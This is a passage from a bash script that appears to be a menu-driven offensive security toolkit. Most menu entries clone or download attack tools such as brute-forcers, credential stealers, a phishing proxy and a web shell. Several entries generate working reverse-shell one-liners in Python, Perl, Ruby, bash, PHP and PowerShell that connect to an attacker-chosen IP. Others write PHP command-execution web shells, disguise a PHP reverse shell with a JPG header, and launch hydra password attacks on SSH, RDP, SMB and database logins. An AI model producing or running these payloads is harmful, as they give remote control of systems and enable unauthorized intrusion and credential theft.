				echo "$FILEPATH"" does not exist"
			fi
		else
			echo "file path is empty"
		fi
	;;
	"110")
		echo "<?php if (!empty($_POST['cmd'])){echo shell_exec($_POST['cmd']);} ?>" > cmd-post.php
	;;
	"111")
		read -p "Digit a file to dump in escaped hex vales: " HEXD
		if [[ -f "$HEXD" ]];
		then
			BSF=$(hexdump -v -e '"\\\x" 1/1 "%02X"' "$HEXD")
			echo "$BSF" | xclip -selection clipboard
			echo "echo -ne \"$BSF\""
			echo -ne "\n"
		fi
	;;
	"112")
		read -p "Digit your IPv4 address: " MIP
		read -p "Digit your port: " MPORT
		if [[ "$MIP" != "" ]];
		then
			if [[ "$MPORT" != "" ]];
			then
				echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"""$MIP""\",""$MPORT""));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
			fi
		fi
	;;
	"113")
		read -p "Digit your IPv4 address: " MIP
		read -p "Digit your port: " MPORT
		if [[ "$MIP" != "" ]];
		then
			if [[ "$MPORT" != "" ]];
			then
				echo "perl -e 'use Socket;$i=\"""$MIP""\";$p=""$MPORT"";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
			fi
		fi
	;;
	"114")
		read -p "Digit your IPv4 address: " MIP
		read -p "Digit your port: " MPORT
		if [[ "$MIP" != "" ]];
		then
			if [[ "$MPORT" != "" ]];
			then
				echo "ruby -rsocket -e'f=TCPSocket.open(\"""$MIP""\",""$MPORT"").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
			fi
		fi
	;;
	"115")
		read -p "Digit your IPv4 address: " MIP
		read -p "Digit your port: " MPORT
		if [[ "$MIP" != "" ]];
		then
			if [[ "$MPORT" != "" ]];
			then
				echo "bash -i >& /dev/tcp/""$MIP""/""$MPORT"" 0>&1"
				echo "bash+-c+'bash+-i+>%26+/dev/tcp/""$MIP""/""$MPORT""+0>%261'"
			fi
		fi
	;;
	"116")
		read -p "Digit your IPv4 address: " MIP
		read -p "Digit your port: " MPORT
		if [[ "$MIP" != "" ]];
		then
			if [[ "$MPORT" != "" ]];
			then
				echo "php -r '\$sock=fsockopen(\""$MIP"\",""$MPORT"");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
			fi
		fi
	;;
	"120")
		Scarica "$ENTRAW""NetSPI/PS_MultiCrack/master/PS_MultiCrack.sh"
	;;
	"121")
		Clona "AlessandroZ/LaZagne"
	;;
	"122")
		Clona "rezasp/joomscan"
	;;
	"123")
		Clona "rastating/joomlavs"
	;;
	"124")
		Clona "RedVirus0/BlackDir-Framework"
	;;
	"125")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""detailyang/readelf/master/readelf/readelf.py"
		fi
	;;
	"126")
		Clona "timbo05sec/autocrack"
	;;
	"127")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""igorMatsunaga/autoCrack/master/autoCrack.py"
		fi
	;;
	"128")
		Clona "xtiankisutsa/MARA_Framework"
	;;
	"129")
		Clona "sowdust/ffff"
	;;
	"130")
		Clona "google/AFL"
	;;
	"131")
		Clona "leobeosab/sharingan"
	;;
	"132")
		Clona "Zarcolio/sitedorks"
	;;
	"133")
		Clona "s0md3v/photon"
	;;
	"134")
		Clona "khalilbijjou/WAFNinja"
	;;
	"140")
		Clona "zznop/drow"
	;;
	"141")
		Clona "pry0cc/axiom"
	;;
	"142")
		Clona "saferwall/saferwall"
	;;
	"143")
		Clona "sysdream/ligolo"
	;;
	"144")
		Clona "snare/voltron"
	;;
	"145")
		Clona "threat9/routersploit"
	;;
	"146")
		Scarica "$ENTRAW""tenable/upnp_info/master/upnp_info.py"
	;;
	"147")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "WalderlanSena/ftpbrute"
		fi
	;;
	"149")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "AlphaRoy14/km985ytv-ftp-exploit"
		fi
	;;
	"150")
		Clona "GitHackTools/FTPBruter"
	;;
	"151")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "DevilSquidSecOps/FTP"
		fi
	;;
	"152")
		Clona "matricali/brutekrag"
	;;
	"153")
		Clona "c0r3dump3d/osueta"
	;;
	"154")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""pentestmonkey/ftp-user-enum/master/ftp-user-enum.pl"
		fi
	;;
	"155")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""W-GOULD/ssh-user-enumeration/master/ssh-check-username.py"
		fi
	;;
	"156")
		Scarica "$ENTRAW""nccgroup/ssh_user_enum/master/ssh_enum.py"
	;;
	"157")
		Clona "0v3rride/Enum4LinuxPy"
	;;
	"158")
		Clona "gehaxelt/Python-dsstore"
	;;
	"159")
		if [[ $(Warning) == "Y" ]];
		then
			mkdir sqlcmd
			cd sqlcmd
			Scarica "$ENTRAW""ccpgames/sqlcmd/master/sqlcmd.py"
			Scarica "$ENTRAW""ccpgames/sqlcmd/master/setup.py"
			cd ..
		fi
	;;
	"160")
		Clona "sqlmapproject/sqlmap"
	;;
	"161")
		Clona "payloadbox/sql-injection-payload-list"
	;;
	"162")
		Clona "fozavci/viproy-VoIPkit"
		Clona "fozavci/metasploit-framework-with-viproy-VoIPkit"
	;;
	"163")
		Clona "luke-goddard/enumy"
	;;
	"164")
		Clona "s0md3v/XSStrike"
	;;
	"165")
		read -p "Digit a path in which mounting remote smb share folder: " PERCO
		if [[ "$PERCO" != "" ]];
		then
			if [[ ! -d "$PERCO" ]];
			then
				mkdir -p "$PERCO"
			fi
			read -p "Digit a remote ip target and remote path of remote smb share folder to mount (example //10.10.10.100/Share): " IPTS
			if [[ "$IPTS" != "" ]];
			then
				read -p "Digit a remote username target, (empty field is for null session): " USERTRG
				if [[ "$USERTRG" != "" ]];
				then
					read -p "Digit a remote username'password target: " PASSTRG
					if [[ "$PASSTRG" != "" ]];
					then
						mount -t cifs -o 'username="$USERTRG",password="$PASSTRG"' "$IPTS" "$PERCO"
					else
						echo "ERROR: Password empty!"
					fi
				else
					mount -t cifs "$IPTS" "$PERCO"
				fi
			fi
		fi
	;;
	"166")
		Clona "linsomniac/python-memcached"
	;;
	"167")
		Clona "govolution/avet"
	;;
	"168")
		Clona "Screetsec/Sudomy"
	;;
	"169")
		Clona "fireeye/flare-floss"
	;;
	"170")
		Scarica "$ENTRAW""sevagas/swap_digger/master/swap_digger.sh"
	;;
	"171")
		Clona "Silv3rHorn/ArtifactExtractor"
	;;
	"172")
		Clona "SekoiaLab/Fastir_Collector"
	;;
	"173")
		Clona "3wker/DLLicous-MaliciousDLL"
	;;
	"174")
		Scarica "$ENTRAW""stormshadow07/HackTheWorld/master/HackTheWorld.py"
	;;
	"175")
		Scarica "$ENTRAW""jtpereyda/boofuzz-ftp/master/ftp.py"
	;;
	"176")
		Clona "sullo/nikto"
	;;
	"177")
		Scarica "$ENTRAW""HightechSec/git-scanner/master/gitscanner.sh"
	;;
	"178")
		Clona "PentesterES/Delorean"
	;;
	"179")
		Clona "BullsEye0/shodan-eye"
	;;
	"180")
		Clona "faizann24/XssPy"
	;;
	"181")
		Clona "secdec/xssmap"
	;;
	"182")
		Clona "gbrindisi/xsssniper"
	;;
	"183")
		Clona "pwn0sec/PwnXSS"
	;;
	"184")
		Clona "lwzSoviet/NoXss"
	;;
	"185")
		Scarica "$ENTRAW""cybercitizen7/Ps1jacker/master/ps1jacker.py"
	;;
	"186")
		Clona "Manisso/fsociety"
	;;
	"187")
		Scarica "$ENTRAW""GrrrDog/TacoTaco/master/tac2cat.py"
		Scarica "$ENTRAW""GrrrDog/TacoTaco/master/tacoflip.py"
	;;
	"188")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "GrrrDog/FlashAV"
		fi
	;;
	"189")
		Scarica "$ENTRAW""GrrrDog/sni_bruter/master/sni_bruter.py"
	;;
	"190")
		Clona "moxie0/sslstrip"
	;;
	"191")
		Scarica "$ENTRAW""m57/piescan/master/piescan.py"
	;;
	"192")
		Clona "projectdiscovery/naabu"
	;;
	"193")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""ahervias77/portscanner/master/portscanner.py"
		fi
	;;
	"194")
		Clona "indutny/heartbleed"
	;;
	"195")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""roflcer/heartbleed-vuln/master/attack.py"
		fi
	;;
	"196")
		Clona "thelinuxchoice/spyeye"
	;;
	"197")
		Clona "sowdust/pdfxplr"
	;;
	"198")
		Clona "wpscanteam/wpscan"
	;;
	"199")
		Clona "MrCl0wnLab/afdWordpress"
	;;
	"200")
		Scarica "$ENTRAW""04x/WpscaN/master/ICgWpScaNNer.py"
	;;
	"201")
		Clona "The404Hacking/wpscan"
	;;
	"202")
		Scarica "$ENTRAW""drego85/JoomlaScan/master/joomlascan.py"
		Scarica "$ENTRAW""drego85/JoomlaScan/master/comptotestdb.txt"
	;;
	"203")
		echo "Digit imap url"
		read -p "(example, imaps://imap.gmail.com/INBOX): " IMAPURL
		if [[ "$IMAPURL" != "" ]];
		then
			read -p "Digit email address: " EMAILADD
			if [[ "$EMAILADD" != "" ]];
			then
				echo "Digit a request"
				read -p "(example, fetch 1:* (UID FLAGS INTERNALDATE ENVELOPE)): " IMAPREQ
				if [[ "$IMAPREQ" != "" ]];
				then
					curl --url "$IMAPURL" --user "$EMAILADD" --request "$IMAPREQ"
				fi
			fi
		fi
	;;
	"204")
		Clona "byt3bl33d3r/SprayingToolkit"
	;;
	"205")
		Clona "mrexodia/haxxmap"
	;;
	"206")
		Clona "lanjelot/patator"
	;;
	"207")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""iomoath/IMAP-Cracker/master/imap-cracker.py"
			Scarica "$ENTRAW""iomoath/IMAP-Cracker/master/top-1000-password.txt"
		fi
	;;
	"208")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""gh0stwizard/p5-udp-scanner/master/udp-scan.pl"
			Scarica "$ENTRAW""gh0stwizard/p5-udp-scanner/master/make.sh"
		fi
	;;
	"209")
		Clona "Knowledge-Wisdom-Understanding/recon"
	;;
	"210")
		Clona "liamg/furious"
	;;
	"211")
		Clona "anvie/port-scanner"
	;;
	"212")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""anrosent/portscan/master/portscan.go"
		fi
	;;
	"213")
		Clona "Arno0x/NtlmRelayToEWS"
	;;
	"214")
		Clona "j3ssie/Osmedeus"
	;;
	"215")
		Clona "evanmiller/hecate"
	;;
	"216")
		Clona "gdbinit/MachOView"
	;;
	"217")
		Clona "cseagle/fREedom"
	;;
	"218")
		Clona "google/binnavi"
	;;
	"219")
		Clona "BinaryAnalysisPlatform/bap"
	;;
	"220")
		Clona "angr/angr"
	;;
	"221")
		Clona "504ensicsLabs/LiME"
	;;
	"222")
		Clona "vivisect/vivisect"
	;;
	"223")
		Clona "unicorn-engine/unicorn"
	;;
	"224")
		Clona "cogent/origami-pdf"
	;;
	"225")
		Clona "idapython/src"
	;;
	"226")
		Clona "erocarrera/pefile"
	;;
	"227")
		Clona "pxb1988/dex2jar"
	;;
	"228")
		Clona "koutto/jok3r"
	;;
	"229")
		Clona "DanMcInerney/icebreaker"
	;;
	"230")
		Clona "youngyangyang04/NoSQLAttack"
	;;
	"231")
		Clona "codingo/NoSQLMap"
	;;
	"232")
		Clona "torque59/Nosql-Exploitation-Framework"
	;;
	"233")
		Scarica "$ENTRAW""aress31/xmlrpc-bruteforcer/master/xmlrpc-bruteforcer.py"
		Scarica "$ENTRAW""aress31/xmlrpc-bruteforcer/master""$RQRM"
	;;
	"234")
		Clona "n4xh4ck5/CMSsc4n"
	;;
	"235")
		Clona "shodansploit/shodansploit"
	;;
	"236")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "ninj4c0d3r/ShodanCli"
		fi
	;;
	"237")
		Clona "mnismt/CompressedCrack"
	;;
	"238")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "brain-lang/brainfuck"
		fi
	;;
	"239")
		Clona "fabianishere/brainfuck"
	;;
	"240")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "luickk/gan-audio-generator"
		fi
	;;
	"241")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "rzbrk/mfv"
		fi
	;;
	"242")
		Clona "smicallef/spiderfoot"
	;;
	"243")
		read -p "Digit your IPv4 address: " MIP
		read -p "Digit your port: " MPORT
		if [[ "$MIP" != "" ]];
		then
			if [[ "$MPORT" != "" ]];
			then
				echo "\$client = New-Object System.Net.Sockets.TCPClient(\"""$MIP""\",""$MPORT"");\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
			fi
		fi
	;;
	"244")
		Clona "s0md3v/Striker"
	;;
	"245")
		Clona "LandGrey/pydictor"
	;;
	"246")
		Clona "danieleperera/OnionIngestor"
	;;
	"247")
		Clona "mufeedvh/basecrack"
	;;
	"248")
		Clona "evyatarmeged/Raccoon"
	;;
	"249")
		Clona "kgretzky/evilginx2"
	;;
	"250")
		Scarica "$ENTRAW""edwardz246003/IIS_exploit/master/exploit.py"
	;;
	"251")
		Clona "irsdl/IIS-ShortName-Scanner"
	;;
	"252")
		Clona "LionSec/katoolin"
	;;
	"253")
		Clona "b3-v3r/Hunner"
	;;
	"254")
		Clona "PowerScript/KatanaFramework"
	;;
	"255")
		Clona "unkn0wnh4ckr/hackers-tool-kit"
	;;
	"256")
		Clona "santatic/web2attack"
	;;
	"257")
		Clona "andyvaikunth/roxysploit"
	;;
	"258")
		Clona "x3omdax/PenBox"
	;;
	"259")
		Clona "dhondta/dronesploit"
	;;
	"260")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "clu8/RainbowTable"
		fi
	;;
	"261")
		Clona "zcdziura/leprechaun"
	;;
	"262")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""CyberKnight00/RainbowHash/master/RainbowHash.py"
		fi
	;;
	"263")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "dgleebits/Double-Rainbow"
		fi
	;;
	"264")
		Clona "jtesta/rainbowcrackalack"
	;;
	"265")
		Clona "sepehrdaddev/hashcobra"
	;;
	"266")
		Clona "google/tsunami-security-scanner"
	;;
	"267")
		Scarica "$ENTRAW""deepsecurity-pe/GoGhost/master/GoGhost.go"
	;;
	"268")
		Clona "wintrmvte/SNOWCRASH"
	;;
	"269")
		Scarica "$ENTRAW""dariusztytko/vhosts-sieve/master/vhosts-sieve.py"
		Scarica "$ENTRAW""dariusztytko/vhosts-sieve/master""$RQRM"
	;;
	"270")
		Scarica "$ENTRAW""Va5c0/Steghide-Brute-Force-Tool/master/steg_brute.py"
	;;
	"271")
		Clona "daniellerch/aletheia"
	;;
	"272")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""Diefunction/stegbrute/master/stegbrute.py"
			Scarica "$ENTRAW""Diefunction/stegbrute/master""$RQRM"
		fi
	;;
	"273")
		Scarica "$ENTRAW""dunossauro/PyRarCrack/master/pyrarcrack.py"
	;;
	"274")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""yasoob/nrc-exporter/master/nrc_exporter.py"
			Scarica "$ENTRAW""yasoob/nrc-exporter/master""$RQRM"
			Scarica "$ENTRAW""yasoob/nrc-exporter/master/setup.py"
		fi
	;;
	"275")
		Clona "CBHue/PyFuscation"
	;;
	"276")
		Clona "m3n0sd0n4ld/uDork"
	;;
	"277")
		Clona "mzfr/slicer"
	;;
	"278")
		Scarica "$ENTRAW""mgeeky/tomcatWarDeployer/master/tomcatWarDeployer.py"
		Scarica "$ENTRAW""mgeeky/tomcatWarDeployer/master""$RQRM"
	;;
	"279")
		Scarica "$ENTRAW""aabeling/portscan/master/index.html"
		Scarica "$ENTRAW""aabeling/portscan/master/portscanner.js"
	;;
	"280")
		Clona "hypn0s/AJPy"
	;;
	"281")
		Clona "berkgoksel/SierraTwo"
	;;
	"282")
		Clona "m4n3dw0lf/pythem"
	;;
	"283")
		Scarica "$ENTRAW""optiv/Talon/master/Talon.go"
	;;
	"284")
		Clona "brutemap-dev/brutemap"
	;;
	"285")
		Clona "louisabraham/ffpass"
	;;
	"286")
		Clona "iphelix/dnschef"
	;;
	"287")
		Clona "boku7/LibreHealth-authRCE"
	;;
	"288")
		Clona "dark-lbp/isf"
	;;
	"289")
		Clona "onccgroup/redsnarf"
	;;
	"290")
		Scarica "$ENTRAW""initstring/evil-ssdp/master/evil_ssdp.py"
	;;
	"291")
		Scarica "$ENTRAW""KALILINUXTRICKSYT/easymacchanger/master/installer.sh"
		Scarica "$ENTRAW""KALILINUXTRICKSYT/easymacchanger/master/easymacchanger"
	;;
	"292")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""sbdchd/macchanger/master/macchanger"
		fi
	;;
	"293")
		Scarica "$ENTRAW""OsandaMalith/PE2HTML/master/PE2HTML.c"
	;;
	"294")
		Clona "TryCatchHCF/Cloakify"
	;;
	"295")
		Clona "wintrmvte/Shellab"
	;;
	"296")
		Clona "Z4nzu/hackingtool"
	;;
	"297")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""OffXec/fastssh/master/fastssh.sh"
		fi
	;;
	"298")
		Clona "lanjelot/patator"
	;;
	"299")
		Clona "brandonskerritt/RustScan"
	;;
	"300")
		Clona "laramies/theHarvester"
	;;
	"301")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""ufuksungu/MySqlBruteForce/master/mysql.py"
		fi
	;;
	"302")
		Clona "duyet/bruteforce-database"
	;;
	"303")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""KTN1990/PostgreSQL--Attack-on-default-password-AUTOEXPLOITING-/master/DB.py"
		fi
	;;
	"304")
		Scarica "$ENTRAW""GitHackTools/BruteDum/master/brutedum.py"
	;;
	"305")
		Scarica "$ENTRAW""lucaboni92/BlueFuzz/master/bluetooth_scanner.py"
		Scarica "$ENTRAW""lucaboni92/BlueFuzz/master/obd_generator.py"
	;;
	"306")
		Clona "lockfale/OSINT-Framework"
	;;
	"307")
		Clona "Netflix-Skunkworks/Scumblr"
	;;
	"308")
		Clona "yogeshojha/rengine"
	;;
	"309")
		Clona "mdsecactivebreach/Chameleon"
	;;
	"310")
		Clona "future-architect/vuls"
	;;
	"311")
		Scarica "$ENTRAW""ethicalhackerproject/TaiPan/master/TaiPan_v1.0.py"
		Scarica "$ENTRAW""ethicalhackerproject/TaiPan/master/listener.py"
	;;
	"312")
		Scarica "$ENTRAW""T-S-A/smbspider/master/smbspider.py"
	;;
	"313")
		Scarica "$ENTRAW""s4vitar/rpcenum/master/rpcenum"
	;;
	"314")
		Scarica "$ENTRAW""danielwolfmann/Invoke-WordThief/master/logger.py"
	;;
	"315")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "M0tHs3C/Hikxploit"
		fi
	;;
	"316")
		Clona "sundowndev/PhoneInfoga"
	;;
	"317")
		read -p "Digit a target domain (example, mydoain.com): " TRGDOM
		if [[ "$TRGDOM" != "" ]];
		then
			for RECORD in A AAAA A+AAAA ANY CNAME MX NS PTR SOA SRV; do dig "$TRGDOM" "$RECORD" >> "$TRGDOM"-nsinfo.txt; done
		fi
	;;
	"318")
		Clona "digininja/pipal"
	;;
	"319")
		Clona "marcrowProject/Bramble"
	;;
	"320")
		Clona "stevemcilwain/quiver"
	;;
	"321")
		Clona "lvaccaro/truecrack"
	;;
	"322")
		Clona "abdulr7mann/hackerEnv"
	;;
	"323")
		Clona "ASHWIN990/ADB-Toolkit"
	;;
	"324")
		hciconfig
		read -p "Digit your Bt device: " BTDEV
		if [[ "$BTDEV" != "" ]];
		then
			hciconfig "$BTDEV" up
			hcitool scan
			read -p "Digit Bt MAC address: " BTMAC
			if [[ "$BTMAC" != "" ]];
			then
				hcitool name "$BTMAC"
				hcitool inq "$BTMAC"
				sdptool browse "$BTMAC"
				l2ping "$BTMAC"
				btscanner
			fi
		fi
	;;
	"325")
		Clona "projectdiscovery/httpx"
	;;
	"326")
		Clona "metachar/PhoneSploit"
	;;
	"327")
		Clona "xtiankisutsa/twiga"
	;;
	"328")
		Clona "citronneur/rdpy"
	;;
	"329")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "aerissecure/rdpy"
		fi
	;;
	"330")
		Clona "fhirschmann/rdp"
	;;
	"331")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""mkdirlove/SSLSTRIP-NG/master/sslstrip-ng.sh"
		fi
	;;
	"332")
		Clona "Ciphey/Ciphey"
	;;
	"333")
		Scarica "$ENTRAW""SecureAuthCorp/impacket/master/examples/smbserver.py"
 	;;
    	"334")
		if [[ -f $(which hydra) ]];
		then
			echo "Digit the protocol to login-attack"
			echo -ne " 1. snmp\n 2. ftp\n 3. ssh\n 4. pop3\n 5. smtp\n 6. rdp\n 7. smb\n 8. ldap2\n 9. vnc\n 10. mysql\n 11. postgresql\n 12. telnet\n"
			read -p "Protocol-type: " PROTO
			read -p "Digit IPtarget or URLtarget: " IP
			if [[ "$IP" != "" ]];
			then
				if [[ "$PROTO" != "" ]];
				then
					echo "Digit a password wordlist filepath"
					find /usr/share/wordlists/
					read -p "(example, /usr/share/wordlists/rockyou.txt): " WORDLIST
					if [[ "$WORDLIST" != "" ]];
					then
						if [[ -f "$WORDLIST" ]];
						then
							if [[ "$PROTO" == "1" ]];
							then
								hydra -P "$WORDLIST" -v "$IP" snmp
							elif [[ "$PROTO" == "9" ]];
							then
								hydra -V -P "$WORDLIST" "$IP" vnc
							else
								echo "Digit ad username or a wordlist username filepath"
								find /usr/share/wordlists
								read -p "(example, admin or /usr/share/wordlists/nmap.lst): " USR
								if [[ "$USR" != "" ]];
								then
									case "$PROTO" in
										"2")
											if [[ -f "$URS" ]];
											then
												hydra -t 1 -L "$USR" -P "$WORDLIST" -vV "$IP" ftp
											else
												hydra -t 1 -l "$USR" -P "$WORDLIST" -vV "$IP" ftp
											fi
										;;
										"3")
											if [[ -f "$URS" ]];
											then
												hydra -L "$USR" -P "$WORDLIST" -v -V "$IP" ssh
											else
												hydra -l "$USR" -P "$WORDLIST" -v -V "$IP" ssh
											fi
										;;
										"4")
											if [[ -f "$URS" ]];
											then
												hydra -P "$WORDLIST" -L "$USR" -f "$IP" -V pop3
											else
												hydra -P "$WORDLIST" -l "$USR" -f "$IP" -V pop3
											fi
										;;
										"5")
											if [[ -f "$URS" ]];
											then
												hydra -L "$USR" -P "$WORDLIST" "$IP" smtp
											else
												hydra -l "$USR" -P "$WORDLIST" "$IP" smtp
											fi
										;;
										"6")
											if [[ -f "$URS" ]];
											then
												hydra -t 1 -V -f -L "$USR" -P "$WORDLIST" rdp://"$IP"
											else
												hydra -t 1 -V -f -l "$USR" -P "$WORDLIST" rdp://"$IP"
											fi
										;;
										"7")
											if [[ -f "$URS" ]];
											then
												hydra -t 1 -V -f -L "$USR" -P "$WORDLIST" "$IP" smb
											else
												hydra -t 1 -V -f -l "$USR" -P "$WORDLIST" "$IP" smb
											fi
										;;
										"8")
											if [[ -f "$URS" ]];
											then
												hydra -V -f -L "$USR" -P "$WORDLIST" "$IP" ldap2
											else
												hydra -V -f -l "$USR" -P "$WORDLIST" "$IP" ldap2
											fi
										;;
										"10")
											if [[ -f "$URS" ]];
											then
												hydra -V -f -L "$USR" -P "$WORDLIST" "$IP" mysql
											else
												hydra -V -f -l "$USR" -P "$WORDLIST" "$IP" mysql
											fi
										;;
										"11")
											if [[ -f "$URS" ]];
											then
												hydra -V -L "$USR" -P "$WORDLIST" "$IP" postgres
											else
												hydra -V -l "$USR" -P "$WORDLIST" "$IP" postgres
											fi
										;;
										"12")
											if [[ -f "$URS" ]];
											then
												hydra -V -L "$USR" -P "$WORDLIST" "$IP" telnet
											else
												hydra -V -l "$USR" -P "$WORDLIST" "$IP" telnet
											fi
										;;
										*)
											echo "Invalid option"
										;;
										esac
								fi
							fi
						else
							echo "$WORDLIST"" does not exist"
						fi
					fi
				fi
			fi
		else
			echo "Please, install hydra-thc tool"
		fi
	;;
	"335")
		Clona "mschwager/fierce"
	;;
	"336")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "sciencemanx/x86-analysis"
		fi
	;;
	"337")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "cryptator/assembly-code-analysis"
		fi
	;;
	"338")
		Clona "plasma-disassembler/plasma"
	;;
	"339")
		Clona "cea-sec/miasm"
	;;
	"340")
		Clona "wisk/medusa"
	;;
	"341")
		Clona "REDasmOrg/REDasm"
	;;
	"342")
		Clona "vivisect/vivisect"
	;;
	"343")
		Scarica "$ENTRAW""busterb/msmailprobe/master/msmailprobe.go"
	;;
	"344")
		Clona "0xZDH/o365spray"
	;;
	"345")
		Scarica "$ENTRAW""gremwell/o365enum/master/o365enum.py"
	;;
	"346")
		Scarica "https://www.benf.org/other/cfr/cfr-0.150.jar"
	;;
	"347")
		Clona "kayak/pypika"
	;;
	"348")
		Clona "brimstone/go-shellcode"
	;;
	"349")
		Scarica "$ENTRAW""TheBinitGhimire/Web-Shells/master/smevk.php"
	;;
	"350")
		echo "Digit a remote IP target"
		read -p "(example, http://192.168.1.1)" IP
		if [[ "$IP" != "" ]];
		then
			echo "Digit a wordlist fullpath"
			find /usr/share/dirbuster/wordlists/
			read -p "(example, /usr/share/dirbuster/wordlists/directory-​list-2.3-medium.txt)" FILENAME
			if [[ -f "$FILENAME" ]];
			then
				gobuster dir -w "$FILENAME" -u "$IP"
			fi
		fi
	;;
	"351")
		Clona "cr0hn/dockerscan"
	;;
	"352")
		Clona "RhinoSecurityLabs/ccat"
	;;
	"353")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "ujjwal96/njaXt"
		fi
	;;
	"354")
		Clona "toxic-ig/SQL-XSS"
	;;
	"355")
		Clona "swisskyrepo/SSRFmap"
	;;
	"356")
		Clona "gquere/pwn_jenkins"
	;;
	"357")
		Clona "java-decompiler/jd-gui"
	;;
	"358")
		Clona "intelowlproject/IntelOwl"
	;;
	"359")
		Clona "lgandx/Responder"
	;;
	"360")
		Clona "tokyoneon/Arcane"
	;;
	"361")
		Clona "yeggor/UEFI_RETool"
	;;
	"362")
		Clona "nidem/kerberoast"
	;;
	"363")
		Clona "projectdiscovery/nuclei"
	;;
	"364")
		Clona "opsdisk/pagodo"
	;;
	"365")
		ls
		echo "Digit a jpg file fullpath to dump jpg header"
		read -p "(example, background.jpg): " JPG
		if [[ -f "$JPG" ]];
		then
			echo "Digit a php revshell file fullpath to add jpg header"
			read -p "(example, revshell.php): " REVSH
			if [[ -f "$REVSH" ]];
			then
				head -c 20 "$JPG" > test.txt
				cat test.txt "$REVSH" > revshell.php.jpg
			fi
		fi
	;;
	"366")
		echo "<?php system($_GET['cmd']); ?>" > cmd-get.php
	;;
	"367")
		echo "<?php system($_REQUESTS['cmd']); ?>" > cmd-reqs.php
	;;
	"368")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "Neetx/sshdodge"
		fi
	;;
	"369")
		Clona "trustedsec/meterssh"
	;;
	"370")
		Scarica "$ENTRAW""norksec/torcrack/master/torcrack.py"
	;;
	"372")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""aryanrtm/sshBrutal/master/sshbrutal.sh"
		fi
	;;
	"373")
		Clona "wuseman/WBRUTER"
	;;
	"374")
		Clona "liggitt/audit2rbac"
	;;
	"375")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""mhausenblas/kaput/master/main.go"
		fi
	;;
	"376")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""mjm918/python-AES-encryption-socket-secure-chat/master/client.py"
			Scarica "$ENTRAW""mjm918/python-AES-encryption-socket-secure-chat/master/server.py"
		fi
	;;
	"377")
		Scarica "$ENTRAW""SusmithKrishnan/neuron/master/neuron.conf"
		Scarica "$ENTRAW""SusmithKrishnan/neuron/master/neuron.py"
		Scarica "$ENTRAW""SusmithKrishnan/neuron/master/server.py"
	;;
	"378")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "ludvigknutsmark/python-chat"
		fi
	;;
	"379")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""sathwikv143/Encrypted-Python-Chat/master/client.py"
			Scarica "$ENTRAW""sathwikv143/Encrypted-Python-Chat/master/server.py"
		fi
	;;
	"380")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""osalpekar/Encrypted-Chat/master/client.py"
			Scarica "$ENTRAW""osalpekar/Encrypted-Chat/master/server.py"
			Scarica "$ENTRAW""osalpekar/Encrypted-Chat/master/utils.py"
		fi
	;;
	"381")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "LatrecheYasser/Secure-Python-Chat"
		fi
	;;
	"382")
		Clona "spec-sec/SecureChat"
	;;
	"384")
		Clona "ernw/ss7MAPer"
	;;
	"385")
		if [[ $(Warning) == "Y" ]];
		then
